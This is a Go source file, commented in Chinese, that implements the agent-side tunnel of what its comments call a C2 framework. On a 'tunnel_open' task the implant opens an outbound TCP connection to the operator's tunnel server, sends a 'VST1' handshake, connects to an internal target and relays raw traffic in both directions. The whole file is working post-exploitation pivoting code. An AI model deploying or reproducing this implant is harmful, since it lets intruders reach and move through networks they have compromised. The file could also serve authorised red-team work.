package main

// 隧道（端口转发）的 agent 侧实现。
//
// 与服务端 c2engine/tunnel_server.go 约定：agent 收到 tunnel_open 任务后，
// 主动向服务器的隧道端口建一条 TCP 连接并握手，再连目标，然后裸转发：
//
//	握手 = "VST1" | chanID u32 LE | targetLen u16 LE | target
//
// 为什么这么做（而不是走 C2 链路）：复刻端的传输都是请求/响应式，隧道流量走
// 控制通道会退化成"每条数据等一个轮询周期"。反向端口转发让隧道独立于 C2 传输，
// HTTP/KCP/WS/DNS 都能用，只要 agent 能出网到隧道端口。

import (
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"
)

// tunnelMagic 必须与 c2engine.TunnelMagic 一致。
const tunnelMagic = "VST1"

// tunnelSessions 记录活动通道，便于 tunnel_close 关闭。
var tunnelSessions = struct {
	sync.Mutex
	m map[uint32]net.Conn
}{m: make(map[uint32]net.Conn)}

// handleTunnelOpen 处理 {"type":"tunnel_open","id":N,"addr":"h:p","target":"h:p"}。
func handleTunnelOpen(chanID uint32, serverAddr, target string) (string, string) {
	if serverAddr == "" || target == "" {
		return "", "tunnel_open requires addr and target"
	}

	up, err := net.DialTimeout("tcp", serverAddr, 10*time.Second)
	if err != nil {
		return "", "dial tunnel server: " + err.Error()
	}

	hdr := make([]byte, 0, len(tunnelMagic)+4+2+len(target))
	hdr = append(hdr, tunnelMagic...)
	var idbuf [4]byte
	binary.LittleEndian.PutUint32(idbuf[:], chanID)
	hdr = append(hdr, idbuf[:]...)
	var lbuf [2]byte
	binary.LittleEndian.PutUint16(lbuf[:], uint16(len(target)))
	hdr = append(hdr, lbuf[:]...)
	hdr = append(hdr, target...)
	if _, err := up.Write(hdr); err != nil {
		_ = up.Close()
		return "", "handshake: " + err.Error()
	}

	down, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		_ = up.Close()
		return "", "dial target: " + err.Error()
	}

	tunnelSessions.Lock()
	tunnelSessions.m[chanID] = up
	tunnelSessions.Unlock()

	go func() {
		defer func() {
			_ = up.Close()
			_ = down.Close()
			tunnelSessions.Lock()
			delete(tunnelSessions.m, chanID)
			tunnelSessions.Unlock()
			logf("tunnel %d closed", chanID)
		}()
		var wg sync.WaitGroup
		wg.Add(2)
		go func() { defer wg.Done(); _, _ = io.Copy(up, down) }()
		go func() { defer wg.Done(); _, _ = io.Copy(down, up) }()
		wg.Wait()
	}()

	return fmt.Sprintf("tunnel %d opened -> %s", chanID, target), ""
}

// handleTunnelClose 关闭一条通道。
func handleTunnelClose(chanID uint32) (string, string) {
	tunnelSessions.Lock()
	conn := tunnelSessions.m[chanID]
	delete(tunnelSessions.m, chanID)
	tunnelSessions.Unlock()
	if conn != nil {
		_ = conn.Close()
	}
	return "tunnel closed", ""
}

// logf 是 agent 侧的轻量日志前缀（避免与 main 的 log 混在一起难分辨）。
func logf(format string, args ...interface{}) {
	log.Printf("["+format+"]", args...)
}

// decodeTunnelID 解析 JSON 里的 id 字段（float64）为 uint32。
func decodeTunnelID(v interface{}) (uint32, bool) {
	f, ok := v.(float64)
	if !ok || f <= 0 {
		return 0, false
	}
	return uint32(f), true
}
